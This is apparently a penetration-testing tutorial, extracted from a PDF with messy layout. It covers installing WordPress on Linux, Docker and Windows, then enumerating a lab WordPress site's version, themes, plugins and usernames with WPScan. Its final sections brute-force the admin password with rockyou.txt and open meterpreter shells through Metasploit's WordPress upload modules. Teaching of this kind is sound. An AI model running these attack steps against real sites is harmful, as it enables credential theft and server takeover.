Abstract 
 
WordPress is a popular open-source content management system (CMS) used to 
create and manage websites. It offers a user-friendly interface, a wide range of 
themes and plugins, making it suitable for both beginners and advanced users to 
build customizable websites. 
In this report, we will show you how to set up WordPress on both Linux and 
Windows, and how to effectively assess the vulnerabilities of a WordPress website 
using one of the most powerful WordPress vulnerability scanners, WPScan. 
Whether you're new to Linux or an experienced user looking to improve your 
penetration testing skills with WordPress, this report will provide valuable insights 
and practical knowledge to help you navigate WordPress for pentesting effectively. 
Disclaimer: This report is provided for educational and informational 
purpose only (Penetration Testing). Penetration Testing refers to legal 
intrusion tests that aim to identify vulnerabilities and improve cybersecurity, 
rather than for malicious purposes.

Install MySQL 
 
For run WordPress, you will also need a database server. The database server is where 
WordPress content is saved. So, we are going to choose MariaDB-server as the required 
database for WordPress and execute the following command  
 
 
Next, execute the following commands to protect remote root login for the database server. 
 
Then respond to questions asked after the command has been executed. 
 
Enter current password for root (enter for none): press the Enter 
 
Set root password? [Y/n]: Y 
 
New password: Enter password 
 
Re-enter new password: Repeat password 
 
Remove anonymous users? [Y/n]: Y 
 
Disallow root login remotely? [Y/n]: Y 
 
Remove test database and access to it? [Y/n]: Y 
 
Reload privilege tables now? [Y/n]: Y 
apt install mariadb-server mariadb-client

WordPress Installation & Configuration 
 
Now, its time to download and install the WordPress on our localhost, with the help of wget 
command we have fetched the compressed file of wordpress setup and extract the folder inside 
the /var/www/html directory. 
cd /var/www/html 
wget http://www.wordpress.org/latest.tar.gz 
tar –xvf latest.tar.gz

Then run the given command to change ownership of ‘wordpress’ directory as well permission 
for upload directory. 
 
 
Now, till here we are done with the installation, to create a WordPress website we need to 
access the application over web browser on localhost by executing following and then complete 
the remaining installation process. 
 
This will open the setup file and ask to choose your preferred language. I select English and 
then press the continue Tab. 
chown -R www-data:www-data wordpress/ 
chmod -R 755  wordpress/ 
mkdir wordpress/wp-content/uploads 
chown -R  www-data:www-data wordpress/wp-content/uploads 
http://localhost/wordpress/

Install WordPress using Docker 
 
Install WordPress through docker will release your effort of installing prerequisites for 
WordPress setup. It is a very easy and quick technique to configured WordPress. All you need 
to have some basic knowledge of Docker and its functionalities. 
To install wordpress using docker, first, we will update the Ubuntu repository and then install 
the latest version of docker.io. Let’s start the installation of docker packages with the apt 
command as below: 
 
 
Docker Compose is used to run multiple containers as a single service. Let’s begin the 
installation of docker-compose with the help of apt by entering the following command. 
 
apt install docker.io 
apt install docker-compose

After installing the composer for the Docker, we must create a directory by the name of 
WordPress. After creating the directory, we will create a .yml file that will contain the service 
definitions for your setup. 
 
 
Now Paste the following text in the .yml and save the configuration. 
 
 
 
 
 
 
 
 
 
mkdir wordpress 
cd wordpress/ 
nano docker-compose.yml

Now run the docker image in detach mode using the following command 
 
 
After doing all the configuration step-by-step, now access the localhost on port 8000 that will 
be hosting your WordPress Docker image and configure your WordPress site as done in the 
previous section. 
docker–compose up -d

You will get the dashboard where you can write your content that to be posted on the website. 
But here we need to make some changes inside the setting so that the wordpress after 
installation it will work properly. Thus, enter your localhost IP address with a port number on 
which your docker image is running.

WordPress Setup for Windows 
 
 
Install WordPress on Windows Platform 
 
Installation of WordPress is also very easy as compared to ubuntu because to fulfil the 
prerequisites of LAMP Server we can use XAMPP that will complete the all required 
dependency like apache and MySQL for WordPress. 
 
Now download the extract the zip file of WordPress inside the /htdocs folder in /xampp folder 
in C-Drive.

Page | 24  
 
Now in order to configure wordpress, explore the /localhost/wordpress/ and then enter the 
detail for the database. 
Note: By Default, XAMPP DB_User is root and DB_Pass is empty <blank> 
So as per XMAPP database configuration, we entered the following details in the given record. 
 
Now again repeat the same step as done in the above section.

WPScan:WordPress Pentesting 
Framework 
 
 “WordPress is one of the most powerful CMS platform, which covers about 35% of the total 
share of the websites over the internet”. Thus in order to enumerate such web-applications, 
we’ll be using “WPScan” – which is a black box vulnerability scanner for WordPress, scripted 
in Ruby to focus on different vulnerabilities that are present in the WordPress applications, 
either in its themes or plugins. 
Well, WPScan comes preinstalled in Kali Linux, SamuraiWTF, Pentoo, BlackArch; which 
scans up its database in order to find out the outdated versions and the vulnerabilities in the 
target’s web application. 
Let’s check out the major things that WPScan can do for us: 
 
Detect the version of currently installed WordPress. 
 
Can detect sensitive files like readme, robots.txt, database replacing files, etc. 
 
Detect enabled features on currently installed WordPress server such as file_upload.

 
Enumerates the themes, plugins along with their versions and tells if they are outdated or not. 
 
It even scans up the web-application to list out the available usernames. 
Let’s start!! 
As discussed earlier, WPScan is installed by default in the Kali Linux machines, so let’s check 
out the default usage options, by simply firing the following command in the terminal. 
 
 
 
wpscan -hh

Scanning the WordPress version of the target’s website 
As we were presented with the default options, let’s now try to do a basic scan over the 
vulnerable WordPress web-application that we’ve set up in our earlier section. 
 
Type the following command to scan the WordPress application and its server. 
 
From the below image you can see that it dumps up everything it could – the WordPress 
version, the Apache server, and even it also found that the upload directory has directory 
listing enables which means anyone can browse to “/wp-content/uploads” in order to check 
out the uploaded files and contents. 
wpscan --url http://192.168.1.105/wordpress/

Enumerating WordPress Themes 
 
Themes play an important role in any CMS web-application, they control the general look & 
feel of the website including its page layout, widget locations, and the default font and colour 
preferences. 
WPScan uses its database which contains about 2600 themes to check the vulnerable installed 
one over the targets.  
In order to check the installed themes of the target’s WordPress web-application, type 
following command: 
 
The “–e” flag is used for enumeration and the “at” flag returns “all themes”. 
You can even use the other flags such as “vt”, to list only the vulnerable themes. 
Thus running the above command, we will be presented with the installed themes with its 
version. 
 
wpscan --url http://192.168.1.105/wordpresws/ -e at

Enumerating WordPress Plugins 
 
Plugins are the small piece of codes, that when added to a WordPress web-application, boost 
up the functionalities, and enhance the website’s features. 
But these plugins may sometimes cause great damage to the web-application due to their 
loosely written codes. 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 33  
 
Lets’s check out the installed plugins on our target’s web-application by executing the below 
command: 
 
Similar to the themes, we can also check the vulnerable plugins by using the “-vp” flag. 
 
After waiting for a few seconds, WPScan will dump our desired result. From the below image, 
you can see the plugins “mail-masta” and “reflex-gallery” are installed over our target’s 
website. As a bonus, we even get the last update and the latest version. 
wpscan --url http://192.168.1.105/wordpress/ -e ap

Enumerating WordPress Usernames 
 
In order to list out usernames of our target’s website privileged users, execute the following 
command: 
 
The flag “u”  will grab all the usernames and will present a list on our screen. 
wpscan –url http://192.168.1.105/wordpress/ -e u 

 
 
 
 
Credits to Hacking Articles 
 
 
Page | 35  
 
 
As WPScan completes its work, we’ll find a list of all the users with their user IDs, in 
accordance with how it grabbed them.

Enumerate ALL with a single command 
 
Does WPScan give us that privilege to scan up the web-applications to check everything in one 
go, whether it is its version, the installed themes, or the plugins? 
Let’s check this out! 
Fire up the following command to grab everything we scanned above for our target web-
application. 
 
–e: at: enumerate all themes of targeted website 
–e: ap: enumerate all plugins of targeted website 
–e: u: enumerate all usernames of targeted website 
 
 
 
 
 
 
wpscan --url http://192.168.1.105/wordpress/ -e at –e ap –e u

Brute-force attack using WPScan 
 
With the help of usernames which we enumerated earlier, we can create a word list of all the 
users and can try a brute-force login attack using the default password list as “rockyou.txt”. 
From the below image you can see our designed wordlist. 
 
Let’s now try to exploit the website by defacing its login credentials using the following 
command: 
 
The –U and the –P  flags are used to set up the username list and the password list respectively. 
 
It will start matching the valid combination of username and password and then dumps the 
result, from the given image you can see we found the login credentials. 
wpscan --url http://192.168.1.105/wordpress/ -U user.txt -P 
/usr/share/wordlists/rockyou.txt

Great!! We got the admin credentials as “admin : jessica”. Let’s try to get into the 
application’s dashboard with them.

Shell Upload using Metasploit 
 
Isn’t it great if you get the target’s shell? 
Run the following commands in order to get a meterpreter session of our target’s web-
application. 
 
This module takes an administrator username and password, logs into the admin panel, and 
uploads a payload packaged as a WordPress plugin. And finally, give us the meterpreter session 
of the webserver. 
 
msf > use exploit/unix/webapp/wp_admin_shell_upload 
msf exploit(wp_admin_shell_upload) > set rhosts 192.168.1.105 
msf exploit(wp_admin_shell_upload) > set username admin 
msf exploit(wp_admin_shell_upload) > set password jessica 
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress 
msf exploit(wp_admin_shell_upload) > exploit

Vulnerable Plugin Exploitation 
 
Here in our website, we found a vulnerable plugin i.e. “slideshowgallery” which contains an 
authenticated file upload vulnerability thus in order to exploit it, we will be using the following 
module which will offer us a reverse shell. 
 
From the below image you can see that we’ve successfully captured our target’s meterpreter 
session. 
 
 
 
use exploit/unix/webapp/wp_slideshowgallery_upload 
msf exploit(wp_slideshowgallery _upload) > set rhost 192.168.1.105 
msf exploit(wp_ slideshowgallery _upload) > set targeturi /wordpress 
msf exploit(wp_ slideshowgallery _upload) > set username admin 
msf exploit(wp_ slideshowgallery _upload) > set password jessica 
msf exploit(wp_ slideshowgallery _upload) > exploit
